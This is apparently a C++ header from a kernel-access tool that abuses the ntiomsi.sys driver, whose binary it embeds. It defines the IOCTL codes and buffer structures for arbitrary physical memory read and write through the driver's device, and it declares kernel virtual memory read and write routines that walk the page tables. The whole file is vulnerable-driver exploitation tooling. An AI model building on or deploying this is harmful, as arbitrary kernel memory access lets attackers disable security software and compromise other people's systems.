#pragma once
#include "ntiomsi_binary.h"
#include "provider.h"
#include "nt.h"

struct BUFFER_IO_PARAMS_FOR_WRITE_PHYSICAL_MEMORY
{
public:
	__int64 PhysicalAddress;
	int BlockLength;
	unsigned int BlockCount;
	char WriteData[64];
};

struct BUFFER_IO_PARAMS_FOR_READ_PHYSICAL_MEMORY
{
	__int64 PhysicalAddress;
	int BlockLength;
	unsigned int BlockCount;
};


#define NTIOMSI_PROVIDER_DRIVER_NAME "ntiomsi.sys"
#define NTIOMSI_PROVIDER_SYMBOLIC_OBJECT_NAME "NTIOLib_ACTIVE_X"

#define IOCTL_READ_PHYSICAL_MEMORY CTL_CODE(0xC350, 0x841, METHOD_BUFFERED, FILE_READ_ACCESS) // 0xC3506104
#define IOCTL_WRITE_PHYSICAL_MEMORY CTL_CODE(0xC350, 0x842, METHOD_BUFFERED, FILE_WRITE_ACCESS) // 0xC350A108

class ntiomsi : public provider {
public:
	ntiomsi() : provider(NTIOMSI_PROVIDER_SYMBOLIC_OBJECT_NAME, NTIOMSI_PROVIDER_DRIVER_NAME, binary_data{ sizeof(g_aNtIoMsiSysBinary), g_aNtIoMsiSysBinary }) {}

	void init() override;
	void read_kernel_virtualmemory(uintptr_t pAddress, size_t size, OUT PVOID pOut) override;
	void write_kernel_virtualmemory(uintptr_t pAddress, PVOID pWriteData, size_t size, OUT PVOID pOldData = nullptr) override;
private:
	__int64 _system_pml4_base;

	__int64 get_system_pml4_base();

	void io_call_read_physical_memory(BUFFER_IO_PARAMS_FOR_READ_PHYSICAL_MEMORY* rIoParams);
	void io_call_write_physical_memory(BUFFER_IO_PARAMS_FOR_WRITE_PHYSICAL_MEMORY* wIoParams);
	__int64 virtual_to_physical_ptr_for_4level_paging(uintptr_t pVirtualAddress, __int64 pml4Base);
};